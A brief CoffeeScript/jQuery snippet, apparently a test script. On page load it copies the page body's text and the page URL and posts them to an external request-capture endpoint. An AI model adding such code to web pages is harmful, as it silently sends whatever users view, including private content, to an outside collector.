$ ->
  clone = $('body').clone()
  clone.find('script').remove()
  $.post "http://requestb.in/1jcz2m01", {url: document.location.href, html: clone.text().replace(/\s/g, "") }, (evt) ->
    console.log('tst')